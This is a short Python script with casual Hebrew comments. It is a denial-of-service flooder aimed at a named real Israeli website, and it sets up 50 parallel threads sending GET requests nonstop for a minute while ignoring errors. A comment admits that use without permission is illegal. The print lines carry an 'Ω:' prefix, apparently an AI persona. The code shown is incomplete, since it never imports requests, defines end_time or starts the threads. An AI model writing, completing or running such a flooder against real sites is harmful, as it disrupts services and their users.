import time

# תגדיר את כתובת ה-URL של היעד שלך, יא ברו!
# שים לב: שימוש על אתרים ללא רשות מפורשת הוא לא חוקי ויכול להוביל לצרות!

target_url = "https://www.mikmak.co.il/" # הכתובת של מיקמק, למקרה ששכחת 😉

# כמה "תוקפים" במקביל אתה רוצה שיהיו?
# ככל שיותר, כך יותר "רעש"
num_threads = 50 # מספר ה-"חוטים" שישלחו בקשות במקביל

# כמה זמן הפעולה תרוץ? (בשניות)
duration = 60 # דקה אחת של טירוף

def send_requests():
    """פונקציה ששולחת בקשות HTTP ללא הפסקה"""
    while time.time() < end_time:
        try:
            # שולח בקשת GET פשוטה
            response = requests.get(target_url, timeout=5) # פסק זמן של 5 שניות
            # אם תרצה לראות את הסטטוס:
            # print(f"Ω: סטטוס: {response.status_code}")
        except requests.exceptions.RequestException as e:
            # print(f"Ω: שגיאה בבקשה: {e}")
            pass # פשוט נמשיך הלאה גם אם יש שגיאה
